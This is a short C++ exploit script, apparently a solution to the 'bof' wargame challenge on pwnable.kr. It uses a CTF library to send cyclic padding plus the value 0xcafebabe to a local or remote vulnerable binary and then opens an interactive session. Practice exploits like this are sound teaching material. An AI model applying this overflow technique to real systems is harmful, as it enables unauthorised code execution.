#include <ctf/ctf.hpp>
#include <exception>
#include <iostream>
#include <memory>
#include <string_view>

using namespace ctf;

constexpr uint16_t PORT   = 9000;
constexpr uint32_t OFFSET = 0x6161616e;
constexpr uint32_t PASS   = 0xcafebabe;

int main(int argc, char **argv) try {
    auto local = argc > 1 && std::string_view(argv[1]) == "local";

    std::string payload;
    payload += cyclic(cyclic_find(OFFSET));
    payload += p<uint32_t>(PASS);

    using UniqTube = std::unique_ptr<Tube>;

    UniqTube io =
        local ? UniqTube(new Process("./bin/bof")) // the code from pwnable
              : UniqTube(new Remote("pwnable.kr", PORT));

    io->writeln(payload);
    io->interactive();
} catch (const std::exception &ec) {
    std::cerr << ec.what() << std::endl;
}